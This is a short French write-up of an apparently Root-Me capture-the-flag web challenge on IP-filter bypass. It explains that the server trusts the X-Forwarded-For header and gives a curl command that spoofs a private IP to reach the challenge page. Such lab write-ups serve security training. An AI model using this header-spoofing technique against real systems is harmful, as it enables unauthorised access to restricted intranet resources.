# Challenge 2 — HTTP - Contournement de filtrage IP

## Niveau

Niveau 1 : Très facile - 10 points

## Énoncé

Chers collègues,

Nous avons réussi à gérer les connexions à l’intranet via les adresses IP privées, il ne sera donc plus nécessaire de vous identifier par compte / mot de passe quand vous serez déjà connecté au réseau interne de l’entreprise.

Cordialement,

L’administrateur réseau

## Explication

Le serveur accepte une valeur arbitraire dans l'en-tête `X-Forwarded-For`. En la falsifiant, il est possible de se faire passer pour une IP autorisée.

## Solution

```bash
curl -i \
  -H 'X-Forwarded-For: 10.0.0.1' \
  http://challenge01.root-me.org/web-serveur/ch68/
```

## Résultat

